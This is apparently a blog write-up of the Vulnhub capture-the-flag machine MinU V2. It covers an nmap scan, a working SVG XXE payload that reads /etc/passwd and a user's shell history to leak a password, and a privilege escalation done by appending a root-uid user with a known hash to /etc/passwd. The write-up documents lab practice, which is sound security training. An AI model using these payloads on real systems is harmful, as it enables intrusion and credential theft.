---  
layout:    post 
title:      "Vulnhub - MinU V2"
date:       2019-07-26
author:     "D4mianwayne"
tag:      nmap, ctf, vulnhub
category: Vulnhub
---

Writeup of MinU V2 from Vulnhub.

# Nmap

Scanning the netwrk reveals we have only two ports open **3306** which is default port for my MySQL and **22** which is default port for SSH. But with the version scanning and `-A` argument we see that nmap has a "?" symbol on the ned of mysql which means that it is not sure that the service running on port **3306** is MySQL or nor. But the further scan reveals it has a HTML page.

```
robin@oracle:~$ nmap -sV -sC -A -p- -T5 192.168.43.172 

Starting Nmap 7.60 ( https://nmap.org ) at 2019-07-26 11:51 IST
Nmap scan report for minuv2 (192.168.43.172)
Host is up (0.00010s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 82:33:25:61:27:97:ea:4a:49:f5:76:a3:33:1c:ae:2b (RSA)
|   256 ed:ca:f6:b9:b5:39:32:89:d0:a3:36:94:82:04:4a:e8 (ECDSA)
|_  256 26:79:15:2e:be:93:02:41:04:c9:ea:e8:05:16:d1:83 (EdDSA)
3306/tcp open  mysql?
| fingerprint-strings: 
|   GenericLines: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain
|     Transfer-Encoding: chunked
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     X-Powered-By: Kemal
|     Content-Type: text/html
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <style type="text/css">
|     body { text-align:center;font-family:helvetica,arial;font-size:22px;
|     color:#888;margin:20px}
|     max-width: 579px; width: 100%; }
|     {margin:0 auto;width:500px;text-align:left}
|     </style>
|     </head>
|     <body>
|     <h2>Kemal doesn't know this way.</h2>
|_    <svg id="svg" version="1.1" width="400" height="400" viewBox="0 0 400 400" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" ><g id="svgg"><path id="path0" d="M262.800 99.200 L 262.800 150.400 265.461 150.400 L 268.121 150.400 267.864 144.300 C 267.722 140.945,267.510 120.110,267.391 98.000 C 267.273 75.890,267.074 55.595,266.948 52.900 L 266.719 48.000 264.760 48.000 L 262.800 48.000 262.800 99.200 M160.800 290.800 C 160.800 291.301,161.224 291.301,162.000
|_mysql-info: ERROR: Script execution failed (use -d to debug)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3306-TCP:V=7.60%I=7%D=7/26%Time=5D3A9C06%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,6D,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20t
SF:ext/plain\r\nTransfer-Encoding:\x20chunked\r\n\r\n10\r\n400\x20Bad\x20R
SF:equest\n\r\n0\r\n\r\n")%r(GetRequest,642C,"HTTP/1\.0\x20404\x20Not\x20F
SF:ound\r\nX-Powered-By:\x20Kemal\r\nContent-Type:\x20text/html\r\n\r\n\x2
SF:0\x20<!DOCTYPE\x20html>\n\x20\x20<html>\n\x20\x20<head>\n\x20\x20\x20\x
SF:20<style\x20type=\"text/css\">\n\x20\x20\x20\x20body\x20{\x20text-align
SF::center;font-family:helvetica,arial;font-size:22px;\n\x20\x20\x20\x20\x
SF:20\x20color:#888;margin:20px}\n\x20\x20\x20\x20img\x20{\x20max-width:\x
SF:20579px;\x20width:\x20100%;\x20}\n\x20\x20\x20\x20#c\x20{margin:0\x20au
SF:to;width:500px;text-align:left}\n\x20\x20\x20\x20</style>\n\x20\x20</he
SF:ad>\n\x20\x20<body>\n\x20\x20\x20\x20<h2>Kemal\x20doesn't\x20know\x20th
SF:is\x20way\.</h2>\n\x20\x20\x20\x20<svg\x20id=\"svg\"\x20version=\"1\.1\
SF:"\x20width=\"400\"\x20height=\"400\"\x20viewBox=\"0\x200\x20400\x20400\
SF:"\x20xmlns=\"http://www\.w3\.org/2000/svg\"\x20xmlns:xlink=\"http://www
SF:\.w3\.org/1999/xlink\"\x20><g\x20id=\"svgg\"><path\x20id=\"path0\"\x20d
SF:=\"M262\.800\x2099\.200\x20L\x20262\.800\x20150\.400\x20265\.461\x20150
SF:\.400\x20L\x20268\.121\x20150\.400\x20267\.864\x20144\.300\x20C\x20267\
SF:.722\x20140\.945,267\.510\x20120\.110,267\.391\x2098\.000\x20C\x20267\.
SF:273\x2075\.890,267\.074\x2055\.595,266\.948\x2052\.900\x20L\x20266\.719
SF:\x2048\.000\x20264\.760\x2048\.000\x20L\x20262\.800\x2048\.000\x20262\.
SF:800\x2099\.200\x20M160\.800\x20290\.800\x20C\x20160\.800\x20291\.301,16
SF:1\.224\x20291\.301,162\.000")%r(HTTPOptions,642C,"HTTP/1\.0\x20404\x20N
SF:ot\x20Found\r\nX-Powered-By:\x20Kemal\r\nContent-Type:\x20text/html\r\n
SF:\r\n\x20\x20<!DOCTYPE\x20html>\n\x20\x20<html>\n\x20\x20<head>\n\x20\x2
SF:0\x20\x20<style\x20type=\"text/css\">\n\x20\x20\x20\x20body\x20{\x20tex
SF:t-align:center;font-family:helvetica,arial;font-size:22px;\n\x20\x20\x2
SF:0\x20\x20\x20color:#888;margin:20px}\n\x20\x20\x20\x20img\x20{\x20max-w
SF:idth:\x20579px;\x20width:\x20100%;\x20}\n\x20\x20\x20\x20#c\x20{margin:
SF:0\x20auto;width:500px;text-align:left}\n\x20\x20\x20\x20</style>\n\x20\
SF:x20</head>\n\x20\x20<body>\n\x20\x20\x20\x20<h2>Kemal\x20doesn't\x20kno
SF:w\x20this\x20way\.</h2>\n\x20\x20\x20\x20<svg\x20id=\"svg\"\x20version=
SF:\"1\.1\"\x20width=\"400\"\x20height=\"400\"\x20viewBox=\"0\x200\x20400\
SF:x20400\"\x20xmlns=\"http://www\.w3\.org/2000/svg\"\x20xmlns:xlink=\"htt
SF:p://www\.w3\.org/1999/xlink\"\x20><g\x20id=\"svgg\"><path\x20id=\"path0
SF:\"\x20d=\"M262\.800\x2099\.200\x20L\x20262\.800\x20150\.400\x20265\.461
SF:\x20150\.400\x20L\x20268\.121\x20150\.400\x20267\.864\x20144\.300\x20C\
SF:x20267\.722\x20140\.945,267\.510\x20120\.110,267\.391\x2098\.000\x20C\x
SF:20267\.273\x2075\.890,267\.074\x2055\.595,266\.948\x2052\.900\x20L\x202
SF:66\.719\x2048\.000\x20264\.760\x2048\.000\x20L\x20262\.800\x2048\.000\x
SF:20262\.800\x2099\.200\x20M160\.800\x20290\.800\x20C\x20160\.800\x20291\
SF:.301,161\.224\x20291\.301,162\.000");

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 94

```


# HTTP Enumeration and SVG XXE LFI

Checking the webpage at `http://192.168.43.172:3306` it has a webpage as analyzed by nmap. But nothing much was there, running gobuster wuth defined file extensions like html, php, xml gives us a `upload.html which turns out to be a upload service but only for SVGs.

![](/img/minu2/gobuster.png)

At first, I thought we have to upload the reverse shell by faking up the header of file but searching through the internet gives us a article [SVG LFI](https://quanyang.github.io/x-ctf-finals-2016-john-slick-web-25/) which wasa CTF challenge back in 2016. So crafting our payload:-

```

<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY output SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<xxe>&output;</xxe>
</svg>

```

![](/img/minu2/etcpass.png)

This will land us to another page saying **Upload OK** and checking the source of the page gives the content of `/etc/passwd` file. Analyzing it for a bit we get to see a entry of user `employer` who has a `/bin/ash` as it's shell. Trying to chck for multiple things like mail, logs etc. I thought of checking `.bash_history` for a second but it was a dead end. Then I tried to open `.ash_history` which has following contents:-

```
<?xml version="1.0"?>
<!DOCTYPE svg [
<!ENTITY output SYSTEM "file:////home/employee/.ash_history">
]>
<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="300" version="1.1" height="200">
<xxe>useradd -D bossdonttrackme -p superultrapass3


exit
</xxe>
</svg>
Upload OK

``` 

Hence, we got a password for user `employer`.

# SSH Login and Root Flag

Using above password, we logged in the minu2 machine via SSH as `employer`. So, starting off with basic enumeration I tried `sudo -l` but got a error. So, I tried `find / -perm -u=s -type f 2>/dev/null` which shows we can use **micro** and **bissuid**. This was time consuming since we have nothing more than a CLI editor and none of the files having any relevant informations. So, I thought that we can access the `/etc/passwd` so I tried to edit with micro with `cat /etc/passwd | micro`. Going to the bottom we add a user since we can use su which can be use to elevate users. 
Using `openssl -passwd -1 -salt new 123` gives us a hash of password so editing the file by adding this line at end `robin:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:root:/bin/ash`. But here we gwt another problem because there is no file like `/bin/ash` so to try again I chnaged it to `robin:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:root:/bin/ashh` which succesfully gives root shell.

![](/img/minu2/root.png)
